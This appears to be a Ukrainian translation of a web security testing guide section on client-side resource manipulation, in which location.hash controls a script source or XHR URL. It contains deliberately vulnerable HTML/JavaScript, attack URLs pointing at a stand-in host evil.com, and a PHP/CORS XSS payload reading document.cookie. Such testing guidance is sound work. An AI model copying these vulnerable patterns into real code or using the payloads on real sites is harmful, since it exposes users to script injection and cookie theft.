# Тестування маніпуляції ресурсами на стороні клієнта
### Резюме
Уразливість маніпулювання ресурсами на стороні клієнта є помилкою перевірки вхідних даних. Це відбувається, коли програма приймає керований користувачем вхід, який визначає шлях до ресурсу, наприклад джерело iframe, JavaScript, аплет або обробник XMLHttpRequest. Ця вразливість полягає в здатності контролювати URL-адреси, які посилаються на деякі ресурси, присутні на веб-сторінці. Вплив цієї вразливості різний, і зазвичай вона використовується для проведення атак XSS. Ця вразливість дає змогу втручатися в очікувану поведінку програми, змушуючи її завантажувати та відтворювати шкідливі об’єкти.

Наведений нижче код JavaScript показує можливий вразливий сценарій, у якому зловмисник може контролювати location.hash (джерело), ​​який досягає атрибута src елемента сценарію. Цей окремий випадок призводить до атаки XSS, оскільки зовнішній JavaScript може бути ін’єктований.

```html
<script>
    var d = document.createElement("script");
    if (location.hash.slice(1)) {
        d.src = location.hash.slice(1);
    }
    document.body.appendChild(d);
</script>
```

Зловмисник може націлитися на жертву, змусивши її відвідати цю URL-адресу:

www.victim.com/#http://evil.com/js.js

Де js.js містить:
```html
alert(document.cookie)
```
Це спричинило б спливаюче сповіщення у браузері жертви.

Більш шкідливий сценарій передбачає можливість контролю URL-адреси, викликаної в запиті CORS. Оскільки CORS дозволяє домену-запиту отримати доступ до цільового ресурсу за допомогою підходу на основі заголовка, зловмисник може попросити цільову сторінку завантажити шкідливий вміст з її власного веб-сайту.

Ось приклад уразливої ​​сторінки:
```html
<b id="p"></b>
<script>
    function createCORSRequest(method, url) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {
                document.getElementById('p').innerHTML = this.responseText;
            }
        };
        return xhr;
    }

    var xhr = createCORSRequest('GET', location.hash.slice(1));
    xhr.send(null);
</script>
```
Location.hash контролюється введенням користувача та використовується для запиту зовнішнього ресурсу, який потім буде відображено через конструкцію innerHTML. Зловмисник може попросити жертву відвідати таку URL-адресу:

www.victim.com/#http://evil.com/html.html

З обробником корисного навантаження для html.html:
```html
<?php
header('Access-Control-Allow-Origin: http://www.victim.com');
?>
<script>alert(document.cookie);</script>
```
### Цілі тесту
- Визначте приймачі зі слабкою перевіркою вхідних даних.
- Оцініть вплив маніпулювання ресурсами.
### Як тестувати
Щоб вручну перевірити наявність такого типу вразливості, ми повинні визначити, чи використовує програма вхідні дані без їх належної перевірки. Якщо так, ці вхідні дані знаходяться під контролем користувача і можуть використовуватися для визначення зовнішніх ресурсів. Оскільки існує багато ресурсів, які можна включити в програму (наприклад, зображення, відео, об’єкти, css та iframe), клієнтські сценарії, які обробляють пов’язані URL-адреси, слід досліджувати на наявність потенційних проблем.

У наступній таблиці показано можливі точки впорскування (заглиблення), які слід перевірити:

|  Тип ресурсу    | Tag/Method               | Sink   |
|-----------------|--------------------------|--------|
| Frame           | `iframe`                 | `src`  |
| Link            | `a`                      | `href` |
| AJAX Request    | `xhr.open(method, [url], true);` | `URL`  |
| CSS             | `link`                   | `href` |
| Image           | `img`                    | `src`  |
| Object          | `object`                 | `data` |
| Script          | `script`                 | `src`  |

Найбільш цікавими є ті, які дозволяють зловмиснику включити клієнтський код (наприклад, JavaScript), який може призвести до вразливості XSS.
